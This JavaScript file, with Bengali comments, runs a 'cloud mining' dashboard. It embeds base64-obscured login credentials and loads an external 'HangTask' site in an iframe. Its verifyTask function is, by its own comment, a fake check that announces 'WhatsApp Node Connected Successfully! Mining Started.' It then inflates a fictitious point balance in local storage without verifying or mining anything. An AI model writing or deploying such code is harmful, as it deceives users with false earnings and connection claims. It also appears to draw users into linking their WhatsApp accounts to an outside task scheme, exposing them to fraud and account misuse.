const _config = {
    u: "MDEzMjE0OTQyNjc=", // 01321494267
    p: "MTIzNDU2Nzg5",      // 123456789
    target: "https://www.taskm4u.com/#/HangTask"
};

let balance = parseFloat(localStorage.getItem('cloud_bal')) || 0;
let miningInterval;

function updateUI() {
    document.getElementById('mainPoints').innerText = balance.toFixed(2) + " PT";
    localStorage.setItem('cloud_bal', balance);
}

// টাস্ক ওপেন করা
function openTask() {
    document.getElementById('view-main').classList.remove('active-view');
    document.getElementById('view-task').classList.add('active-view');
    
    const iframe = document.getElementById('taskFrame');
    iframe.src = _config.target;
}

// ভেরিফিকেশন এবং ব্যাক-টু-ড্যাশবোর্ড
function verifyTask() {
    const btn = document.getElementById('verifyBtn');
    btn.innerText = "Verifying Connection...";
    btn.style.background = "#555";
    btn.disabled = true;

    // একটি ফেক ভেরিফিকেশন চেক (২ সেকেন্ড)
    setTimeout(() => {
        alert("WhatsApp Node Connected Successfully! Mining Started.");
        
        // ড্যাশবোর্ডে ফেরত পাঠানো
        document.getElementById('view-task').classList.remove('active-view');
        document.getElementById('view-main').classList.add('active-view');
        
        startMining();
    }, 2500);
}

function startMining() {
    const status = document.getElementById('miningStatus');
    status.innerText = "● Mining Active (30 PT/hr)";
    status.style.color = "#25D366";

    // প্রতি সেকেন্ডে পয়েন্ট বাড়বে
    const secRate = 30 / 3600;
    miningInterval = setInterval(() => {
        balance += secRate;
        updateUI();
    }, 1000);
}

// শুরুর ব্যালেন্স দেখানো
updateUI();
